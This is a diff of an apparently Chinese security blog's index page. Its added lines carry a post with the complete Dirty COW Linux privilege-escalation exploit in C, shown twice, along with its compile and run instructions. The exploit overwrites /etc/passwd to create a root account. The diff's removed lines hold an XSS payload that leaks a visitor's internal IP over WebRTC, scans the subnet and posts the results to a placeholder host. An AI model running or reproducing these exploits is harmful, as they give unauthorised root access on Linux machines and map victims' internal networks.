@@ -117,6 +117,456 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/09/12/c0w.html" >C0w</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-09-12  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</a></p>
+<pre class="line-numbers language-none"><code class="language-none">Compile with:
+&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
+&#x2F;&#x2F;
+&#x2F;&#x2F; Then run the newly create binary by either doing:
+&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
+&#x2F;&#x2F;
+&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
+&#x2F;&#x2F;
+&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
+&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;
+&#x2F;&#x2F; This exploit uses the pokemon exploit of the dirtycow vulnerability
+&#x2F;&#x2F; as a base and automatically generates a new passwd line.
+&#x2F;&#x2F; The user will be prompted for the new password when the binary is run.
+&#x2F;&#x2F; The original &#x2F;etc&#x2F;passwd file is then backed up to &#x2F;tmp&#x2F;passwd.bak
+&#x2F;&#x2F; and overwrites the root account with the generated line.
+&#x2F;&#x2F; After running the exploit you should be able to login with the newly
+&#x2F;&#x2F; created user.
+&#x2F;&#x2F;
+&#x2F;&#x2F; To use this exploit modify the user values according to your needs.
+&#x2F;&#x2F;   The default is &quot;firefart&quot;.
+&#x2F;&#x2F;
+&#x2F;&#x2F; Original exploit (dirtycow&#39;s ptrace_pokedata &quot;pokemon&quot; method):
+&#x2F;&#x2F;   https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;pokemon.c
+&#x2F;&#x2F;
+&#x2F;&#x2F; Compile with:
+&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
+&#x2F;&#x2F;
+&#x2F;&#x2F; Then run the newly create binary by either doing:
+&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
+&#x2F;&#x2F;
+&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
+&#x2F;&#x2F;
+&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
+&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
+&#x2F;&#x2F;
+&#x2F;&#x2F; Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer
+&#x2F;&#x2F; https:&#x2F;&#x2F;firefart.at
+&#x2F;&#x2F;
+
+#include &lt;fcntl.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;sys&#x2F;mman.h&gt;
+#include &lt;sys&#x2F;types.h&gt;
+#include &lt;sys&#x2F;stat.h&gt;
+#include &lt;sys&#x2F;wait.h&gt;
+#include &lt;sys&#x2F;ptrace.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;crypt.h&gt;
+
+const char *filename &#x3D; &quot;&#x2F;etc&#x2F;passwd&quot;;
+const char *backup_filename &#x3D; &quot;&#x2F;tmp&#x2F;passwd.bak&quot;;
+const char *salt &#x3D; &quot;firefart&quot;;
+
+int f;
+void *map;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+
+struct Userinfo &#123;
+   char *username;
+   char *hash;
+   int user_id;
+   int group_id;
+   char *info;
+   char *home_dir;
+   char *shell;
+&#125;;
+
+char *generate_password_hash(char *plaintext_pw) &#123;
+  return crypt(plaintext_pw, salt);
+&#125;
+
+char *generate_passwd_line(struct Userinfo u) &#123;
+  const char *format &#x3D; &quot;%s:%s:%d:%d:%s:%s:%s\n&quot;;
+  int size &#x3D; snprintf(NULL, 0, format, u.username, u.hash,
+    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
+  char *ret &#x3D; malloc(size + 1);
+  sprintf(ret, format, u.username, u.hash, u.user_id,
+    u.group_id, u.info, u.home_dir, u.shell);
+  return ret;
+&#125;
+
+void *madviseThread(void *arg) &#123;
+  int i, c &#x3D; 0;
+  for(i &#x3D; 0; i &lt; 200000000; i++) &#123;
+    c +&#x3D; madvise(map, 100, MADV_DONTNEED);
+  &#125;
+  printf(&quot;madvise %d\n\n&quot;, c);
+&#125;
+
+int copy_file(const char *from, const char *to) &#123;
+  &#x2F;&#x2F; check if target file already exists
+  if(access(to, F_OK) !&#x3D; -1) &#123;
+    printf(&quot;File %s already exists! Please delete it and run again\n&quot;,
+      to);
+    return -1;
+  &#125;
+
+  char ch;
+  FILE *source, *target;
+
+  source &#x3D; fopen(from, &quot;r&quot;);
+  if(source &#x3D;&#x3D; NULL) &#123;
+    return -1;
+  &#125;
+  target &#x3D; fopen(to, &quot;w&quot;);
+  if(target &#x3D;&#x3D; NULL) &#123;
+     fclose(source);
+     return -1;
+  &#125;
+
+  while((ch &#x3D; fgetc(source)) !&#x3D; EOF) &#123;
+     fputc(ch, target);
+   &#125;
+
+  printf(&quot;%s successfully backed up to %s\n&quot;,
+    from, to);
+
+  fclose(source);
+  fclose(target);
+
+  return 0;
+&#125;
+
+int main(int argc, char *argv[])
+&#123;
+  &#x2F;&#x2F; backup file
+  int ret &#x3D; copy_file(filename, backup_filename);
+  if (ret !&#x3D; 0) &#123;
+    exit(ret);
+  &#125;
+
+  struct Userinfo user;
+  &#x2F;&#x2F; set values, change as needed
+  user.username &#x3D; &quot;firefart&quot;;
+  user.user_id &#x3D; 0;
+  user.group_id &#x3D; 0;
+  user.info &#x3D; &quot;pwned&quot;;
+  user.home_dir &#x3D; &quot;&#x2F;root&quot;;
+  user.shell &#x3D; &quot;&#x2F;bin&#x2F;bash&quot;;
+
+  char *plaintext_pw;
+
+  if (argc &gt;&#x3D; 2) &#123;
+    plaintext_pw &#x3D; argv[1];
+    printf(&quot;Please enter the new password: %s\n&quot;, plaintext_pw);
+  &#125; else &#123;
+    plaintext_pw &#x3D; getpass(&quot;Please enter the new password: &quot;);
+  &#125;
+
+  user.hash &#x3D; generate_password_hash(plaintext_pw);
+  char *complete_passwd_line &#x3D; generate_passwd_line(user);
+  printf(&quot;Complete line:\n%s\n&quot;, complete_passwd_line);
+
+  f &#x3D; open(filename, O_RDONLY);
+  fstat(f, &amp;st);
+  map &#x3D; mmap(NULL,
+             st.st_size + sizeof(long),
+             PROT_READ,
+             MAP_PRIVATE,
+             f,
+             0);
+  printf(&quot;mmap: %lx\n&quot;,(unsigned long)map);
+  pid &#x3D; fork();
+  if(pid) &#123;
+    waitpid(pid, NULL, 0);
+    int u, i, o, c &#x3D; 0;
+    int l&#x3D;strlen(complete_passwd_line);
+    for(i &#x3D; 0; i &lt; 10000&#x2F;l; i++) &#123;
+      for(o &#x3D; 0; o &lt; l; o++) &#123;
+        for(u &#x3D; 0; u &lt; 10000; u++) &#123;
+          c +&#x3D; ptrace(PTRACE_POKETEXT,
+                      pid,
+                      map + o,
+                      *((long*)(complete_passwd_line + o)));
+        &#125;
+      &#125;
+    &#125;
+    printf(&quot;ptrace %d\n&quot;,c);
+  &#125;
+  else &#123;
+    pthread_create(&amp;pth,
+                   NULL,
+                   madviseThread,
+                   NULL);
+    ptrace(PTRACE_TRACEME);
+    kill(getpid(), SIGSTOP);
+    pthread_join(pth,NULL);
+  &#125;
+
+  printf(&quot;Done! Check %s to see if the new user was created.\n&quot;, filename);
+  printf(&quot;You can log in with the username &#39;%s&#39; and the password &#39;%s&#39;.\n\n&quot;,
+    user.username, plaintext_pw);
+    printf(&quot;\nDON&#39;T FORGET TO RESTORE! $ mv %s %s\n&quot;,
+    backup_filename, filename);
+  return 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2017/09/12/c0w.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</a></p>
+<pre class="line-numbers language-none"><code class="language-none">Compile with:
+&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
+&#x2F;&#x2F;
+&#x2F;&#x2F; Then run the newly create binary by either doing:
+&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
+&#x2F;&#x2F;
+&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
+&#x2F;&#x2F;
+&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
+&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;
+&#x2F;&#x2F; This exploit uses the pokemon exploit of the dirtycow vulnerability
+&#x2F;&#x2F; as a base and automatically generates a new passwd line.
+&#x2F;&#x2F; The user will be prompted for the new password when the binary is run.
+&#x2F;&#x2F; The original &#x2F;etc&#x2F;passwd file is then backed up to &#x2F;tmp&#x2F;passwd.bak
+&#x2F;&#x2F; and overwrites the root account with the generated line.
+&#x2F;&#x2F; After running the exploit you should be able to login with the newly
+&#x2F;&#x2F; created user.
+&#x2F;&#x2F;
+&#x2F;&#x2F; To use this exploit modify the user values according to your needs.
+&#x2F;&#x2F;   The default is &quot;firefart&quot;.
+&#x2F;&#x2F;
+&#x2F;&#x2F; Original exploit (dirtycow&#39;s ptrace_pokedata &quot;pokemon&quot; method):
+&#x2F;&#x2F;   https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io&#x2F;blob&#x2F;master&#x2F;pokemon.c
+&#x2F;&#x2F;
+&#x2F;&#x2F; Compile with:
+&#x2F;&#x2F;   gcc -pthread dirty.c -o dirty -lcrypt
+&#x2F;&#x2F;
+&#x2F;&#x2F; Then run the newly create binary by either doing:
+&#x2F;&#x2F;   &quot;.&#x2F;dirty&quot; or &quot;.&#x2F;dirty my-new-password&quot;
+&#x2F;&#x2F;
+&#x2F;&#x2F; Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;
+&#x2F;&#x2F;
+&#x2F;&#x2F; DON&#39;T FORGET TO RESTORE YOUR &#x2F;etc&#x2F;passwd AFTER RUNNING THE EXPLOIT!
+&#x2F;&#x2F;   mv &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd
+&#x2F;&#x2F;
+&#x2F;&#x2F; Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer
+&#x2F;&#x2F; https:&#x2F;&#x2F;firefart.at
+&#x2F;&#x2F;
+
+#include &lt;fcntl.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;sys&#x2F;mman.h&gt;
+#include &lt;sys&#x2F;types.h&gt;
+#include &lt;sys&#x2F;stat.h&gt;
+#include &lt;sys&#x2F;wait.h&gt;
+#include &lt;sys&#x2F;ptrace.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;crypt.h&gt;
+
+const char *filename &#x3D; &quot;&#x2F;etc&#x2F;passwd&quot;;
+const char *backup_filename &#x3D; &quot;&#x2F;tmp&#x2F;passwd.bak&quot;;
+const char *salt &#x3D; &quot;firefart&quot;;
+
+int f;
+void *map;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+
+struct Userinfo &#123;
+   char *username;
+   char *hash;
+   int user_id;
+   int group_id;
+   char *info;
+   char *home_dir;
+   char *shell;
+&#125;;
+
+char *generate_password_hash(char *plaintext_pw) &#123;
+  return crypt(plaintext_pw, salt);
+&#125;
+
+char *generate_passwd_line(struct Userinfo u) &#123;
+  const char *format &#x3D; &quot;%s:%s:%d:%d:%s:%s:%s\n&quot;;
+  int size &#x3D; snprintf(NULL, 0, format, u.username, u.hash,
+    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
+  char *ret &#x3D; malloc(size + 1);
+  sprintf(ret, format, u.username, u.hash, u.user_id,
+    u.group_id, u.info, u.home_dir, u.shell);
+  return ret;
+&#125;
+
+void *madviseThread(void *arg) &#123;
+  int i, c &#x3D; 0;
+  for(i &#x3D; 0; i &lt; 200000000; i++) &#123;
+    c +&#x3D; madvise(map, 100, MADV_DONTNEED);
+  &#125;
+  printf(&quot;madvise %d\n\n&quot;, c);
+&#125;
+
+int copy_file(const char *from, const char *to) &#123;
+  &#x2F;&#x2F; check if target file already exists
+  if(access(to, F_OK) !&#x3D; -1) &#123;
+    printf(&quot;File %s already exists! Please delete it and run again\n&quot;,
+      to);
+    return -1;
+  &#125;
+
+  char ch;
+  FILE *source, *target;
+
+  source &#x3D; fopen(from, &quot;r&quot;);
+  if(source &#x3D;&#x3D; NULL) &#123;
+    return -1;
+  &#125;
+  target &#x3D; fopen(to, &quot;w&quot;);
+  if(target &#x3D;&#x3D; NULL) &#123;
+     fclose(source);
+     return -1;
+  &#125;
+
+  while((ch &#x3D; fgetc(source)) !&#x3D; EOF) &#123;
+     fputc(ch, target);
+   &#125;
+
+  printf(&quot;%s successfully backed up to %s\n&quot;,
+    from, to);
+
+  fclose(source);
+  fclose(target);
+
+  return 0;
+&#125;
+
+int main(int argc, char *argv[])
+&#123;
+  &#x2F;&#x2F; backup file
+  int ret &#x3D; copy_file(filename, backup_filename);
+  if (ret !&#x3D; 0) &#123;
+    exit(ret);
+  &#125;
+
+  struct Userinfo user;
+  &#x2F;&#x2F; set values, change as needed
+  user.username &#x3D; &quot;firefart&quot;;
+  user.user_id &#x3D; 0;
+  user.group_id &#x3D; 0;
+  user.info &#x3D; &quot;pwned&quot;;
+  user.home_dir &#x3D; &quot;&#x2F;root&quot;;
+  user.shell &#x3D; &quot;&#x2F;bin&#x2F;bash&quot;;
+
+  char *plaintext_pw;
+
+  if (argc &gt;&#x3D; 2) &#123;
+    plaintext_pw &#x3D; argv[1];
+    printf(&quot;Please enter the new password: %s\n&quot;, plaintext_pw);
+  &#125; else &#123;
+    plaintext_pw &#x3D; getpass(&quot;Please enter the new password: &quot;);
+  &#125;
+
+  user.hash &#x3D; generate_password_hash(plaintext_pw);
+  char *complete_passwd_line &#x3D; generate_passwd_line(user);
+  printf(&quot;Complete line:\n%s\n&quot;, complete_passwd_line);
+
+  f &#x3D; open(filename, O_RDONLY);
+  fstat(f, &amp;st);
+  map &#x3D; mmap(NULL,
+             st.st_size + sizeof(long),
+             PROT_READ,
+             MAP_PRIVATE,
+             f,
+             0);
+  printf(&quot;mmap: %lx\n&quot;,(unsigned long)map);
+  pid &#x3D; fork();
+  if(pid) &#123;
+    waitpid(pid, NULL, 0);
+    int u, i, o, c &#x3D; 0;
+    int l&#x3D;strlen(complete_passwd_line);
+    for(i &#x3D; 0; i &lt; 10000&#x2F;l; i++) &#123;
+      for(o &#x3D; 0; o &lt; l; o++) &#123;
+        for(u &#x3D; 0; u &lt; 10000; u++) &#123;
+          c +&#x3D; ptrace(PTRACE_POKETEXT,
+                      pid,
+                      map + o,
+                      *((long*)(complete_passwd_line + o)));
+        &#125;
+      &#125;
+    &#125;
+    printf(&quot;ptrace %d\n&quot;,c);
+  &#125;
+  else &#123;
+    pthread_create(&amp;pth,
+                   NULL,
+                   madviseThread,
+                   NULL);
+    ptrace(PTRACE_TRACEME);
+    kill(getpid(), SIGSTOP);
+    pthread_join(pth,NULL);
+  &#125;
+
+  printf(&quot;Done! Check %s to see if the new user was created.\n&quot;, filename);
+  printf(&quot;You can log in with the username &#39;%s&#39; and the password &#39;%s&#39;.\n\n&quot;,
+    user.username, plaintext_pw);
+    printf(&quot;\nDON&#39;T FORGET TO RESTORE! $ mv %s %s\n&quot;,
+    backup_filename, filename);
+  return 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2017/09/12/c0w.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/08/15/elk_basic.html" >elk操作相关</a>
 		</h3>
 		</div>
@@ -465,206 +915,6 @@ msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-row
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/05/23/xss-get-ip.html" >XSS获取内网地址</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-05-23  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="http://cb.drops.wiki/bugs/wooyun-2014-076685.html">http://cb.drops.wiki/bugs/wooyun-2014-076685.html</a> </p>
-<p>代码未测试</p>
-<pre class="line-numbers language-none"><code class="language-none">var RTCPeerConnection &#x3D; window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
-if (RTCPeerConnection) (function()&#123;
-	var rtc &#x3D; new RTCPeerConnection(&#123;iceServers:[]&#125;);
-	if (window.mozRTCPeerConnection)&#123;
-		rtc.createDataChannel(&#39;&#39;,&#123;reliable:false&#125;);
-	&#125;;
-	rtc.onicecandidate &#x3D; function(evt)&#123;
-		if (evt.candidate) grepSDP(evt.candidate.candidate);
-	&#125;;
-	rtc.createOffer(function(offerDesc)&#123;
-		grepSDP(offerDesc.sdp);
-		rtc.setLocalDescription(offerDesc);
-	&#125;,function(e)&#123;console.warn(&quot;offer failed&quot;, e);&#125;);
-	var addrs &#x3D; Object.create(null);
-	addrs[&quot;0.0.0.0&quot;] &#x3D; false;
-	function updateDisplay(newAddr)&#123;
-		if(newAddr in addrs) return;
-		else addrs[newAddr] &#x3D; true;
-		var displayAddrs &#x3D; Object.keys(addrs).filter(function(k)&#123;return addrs[k];&#125;);
-		var address &#x3D; displayAddrs.join(&quot;or perhaps&quot;) || &quot;n&#x2F;a&quot;;
-		sendip(address);
-	&#125;
-	function grepSDP(sdp)&#123;
-		var hosts &#x3D; [];
-		sdp.split(&#39;\r\n&#39;).forEach(function(line)&#123;
-			if(~line.indexOf(&quot;a&#x3D;candidate&quot;))&#123;
-				var parts &#x3D; line.split(&#39; &#39;),
-				addr &#x3D; parts[4],
-				type &#x3D; parts[7];
-				if(type &#x3D;&#x3D;&#x3D; &#39;host&#39;) updateDisplay(addr);
-			&#125;else if(~line.indexOf(&quot;c&#x3D;&quot;))&#123;
-				var parts &#x3D; line.split(&#39; &#39;),
-				addr &#x3D; parts[2];
-				updateDisplay(addr);
-			&#125;
-		&#125;);
-	&#125;
-&#125;)();
-function sendip(ipaddress)&#123;
-	var url &#x3D; &quot;xxxxx&quot;;
-&#125;
-
-＝＝＝＝代码貌似不全＝＝＝＝
-
-function ipsend(ip, netport)&#123;
-	var ipdata &#x3D; ip+&quot;:&quot;+netport;
-	var url &#x3D; &quot;x.x.x.x&quot;;
-	var xmlhttp1 &#x3D; new XMLHttpRequest();
-	xmlhttp1.open(&quot;POST&quot;,url,true);
-	xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);
-	xmlhttp1.send(&quot;ip&#x3D;&#x3D;&lt;!--start--&gt;&quot; + ipdata);
-
-function ipCreate(ip)&#123;
-	var ips &#x3D; ip.replace(&#x2F;(\d+\.\d+\.\d+)\.\d+&#x2F;,&#39;$1.&#39;);
-	for(var i&#x3D;1;i&lt;&#x3D;255;i++)&#123;
-		ElementCreate(ips+i,&quot;80&quot;,i);
-		ElementCreate(ips+i,&quot;8087&quot;,i);
-		ElementCreate(ips+i,&quot;8080&quot;,i);
-	&#125;
-&#125;
-function ElementCreate(ip,xport,i)&#123;
-	var url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+xport;
-	var scriptElement &#x3D; document.createElement(&quot;script&quot;);
-	scriptElement.src &#x3D; url;
-	scriptElement.setAttribute(&quot;onload&quot;,&quot;ipsend(\&#39;&quot;+ip+&quot;\&#39;,\&#39;&quot;+xport+&quot;\&#39;)&quot;);
-	document.body.appendChild(scriptElement);
-&#125;
-ipcreate(&quot;10.10.125.195&quot;);
-&#125;
-
-&#x3D;＝＝＝＝代码貌似不全＝＝＝＝
-
-
-
-
-
-
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2017/05/23/xss-get-ip.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="http://cb.drops.wiki/bugs/wooyun-2014-076685.html">http://cb.drops.wiki/bugs/wooyun-2014-076685.html</a> </p>
-<p>代码未测试</p>
-<pre class="line-numbers language-none"><code class="language-none">var RTCPeerConnection &#x3D; window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
-if (RTCPeerConnection) (function()&#123;
-	var rtc &#x3D; new RTCPeerConnection(&#123;iceServers:[]&#125;);
-	if (window.mozRTCPeerConnection)&#123;
-		rtc.createDataChannel(&#39;&#39;,&#123;reliable:false&#125;);
-	&#125;;
-	rtc.onicecandidate &#x3D; function(evt)&#123;
-		if (evt.candidate) grepSDP(evt.candidate.candidate);
-	&#125;;
-	rtc.createOffer(function(offerDesc)&#123;
-		grepSDP(offerDesc.sdp);
-		rtc.setLocalDescription(offerDesc);
-	&#125;,function(e)&#123;console.warn(&quot;offer failed&quot;, e);&#125;);
-	var addrs &#x3D; Object.create(null);
-	addrs[&quot;0.0.0.0&quot;] &#x3D; false;
-	function updateDisplay(newAddr)&#123;
-		if(newAddr in addrs) return;
-		else addrs[newAddr] &#x3D; true;
-		var displayAddrs &#x3D; Object.keys(addrs).filter(function(k)&#123;return addrs[k];&#125;);
-		var address &#x3D; displayAddrs.join(&quot;or perhaps&quot;) || &quot;n&#x2F;a&quot;;
-		sendip(address);
-	&#125;
-	function grepSDP(sdp)&#123;
-		var hosts &#x3D; [];
-		sdp.split(&#39;\r\n&#39;).forEach(function(line)&#123;
-			if(~line.indexOf(&quot;a&#x3D;candidate&quot;))&#123;
-				var parts &#x3D; line.split(&#39; &#39;),
-				addr &#x3D; parts[4],
-				type &#x3D; parts[7];
-				if(type &#x3D;&#x3D;&#x3D; &#39;host&#39;) updateDisplay(addr);
-			&#125;else if(~line.indexOf(&quot;c&#x3D;&quot;))&#123;
-				var parts &#x3D; line.split(&#39; &#39;),
-				addr &#x3D; parts[2];
-				updateDisplay(addr);
-			&#125;
-		&#125;);
-	&#125;
-&#125;)();
-function sendip(ipaddress)&#123;
-	var url &#x3D; &quot;xxxxx&quot;;
-&#125;
-
-＝＝＝＝代码貌似不全＝＝＝＝
-
-function ipsend(ip, netport)&#123;
-	var ipdata &#x3D; ip+&quot;:&quot;+netport;
-	var url &#x3D; &quot;x.x.x.x&quot;;
-	var xmlhttp1 &#x3D; new XMLHttpRequest();
-	xmlhttp1.open(&quot;POST&quot;,url,true);
-	xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);
-	xmlhttp1.send(&quot;ip&#x3D;&#x3D;&lt;!--start--&gt;&quot; + ipdata);
-
-function ipCreate(ip)&#123;
-	var ips &#x3D; ip.replace(&#x2F;(\d+\.\d+\.\d+)\.\d+&#x2F;,&#39;$1.&#39;);
-	for(var i&#x3D;1;i&lt;&#x3D;255;i++)&#123;
-		ElementCreate(ips+i,&quot;80&quot;,i);
-		ElementCreate(ips+i,&quot;8087&quot;,i);
-		ElementCreate(ips+i,&quot;8080&quot;,i);
-	&#125;
-&#125;
-function ElementCreate(ip,xport,i)&#123;
-	var url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+xport;
-	var scriptElement &#x3D; document.createElement(&quot;script&quot;);
-	scriptElement.src &#x3D; url;
-	scriptElement.setAttribute(&quot;onload&quot;,&quot;ipsend(\&#39;&quot;+ip+&quot;\&#39;,\&#39;&quot;+xport+&quot;\&#39;)&quot;);
-	document.body.appendChild(scriptElement);
-&#125;
-ipcreate(&quot;10.10.125.195&quot;);
-&#125;
-
-&#x3D;＝＝＝＝代码貌似不全＝＝＝＝
-
-
-
-
-
-
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span